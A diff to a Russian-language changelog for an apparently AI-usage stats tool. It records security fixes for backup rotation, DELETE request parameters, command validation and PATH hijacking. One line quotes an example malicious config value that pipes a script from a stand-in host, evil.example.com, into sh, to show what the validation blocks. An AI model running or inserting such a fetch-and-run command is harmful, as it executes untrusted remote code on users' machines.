@@ -5,6 +5,11 @@
 
 ## [Unreleased]
 
+### Security pass #4 — гигиена (backup rotation, DELETE dual-send)
+
+- **`DatabaseImporter` теперь чистит старые бэкапы** после успешного импорта — оставляет последние 3 (`stats.db.backup-<timestamp>`). Раньше копились вечно, каждый = размер текущей БД. Файлы не с нашим префиксом не трогаем. На failure-пути бэкапы не вычищаем — safety net остаётся.
+- **`removeFriend` дублирует `block`-флаг в query И в body.** Прокси/CDN (Cloudflare и т.п.) исторически выкидывают body у DELETE-запросов — `block` тихо переставал бы работать. Body сохранили для backward-compat с текущим сервером; когда server-side научится читать query — body убираем в follow-up.
+
 ### Security pass #3 — PATH-hijack, os.Logger privacy, валидация DB-import
 
 - **`ccusage_command[0]` валидируется** перед запуском Process: разрешены только `npx`, `bunx` или абсолютный путь (с запретом `..` внутри). Закрывает arbitrary command execution через подмену `~/.config/ai-stats/config.json` (например `["curl", "evil.example.com/script", "|", "sh"]`). Из `extraSearchPaths` убран home-relative `~/.bun/bin` — home-writable, PATH-hijack-vector. Bun-юзеры добавляют bun в shell PATH (env прокидывается child'у через `enrichedEnvironment`).
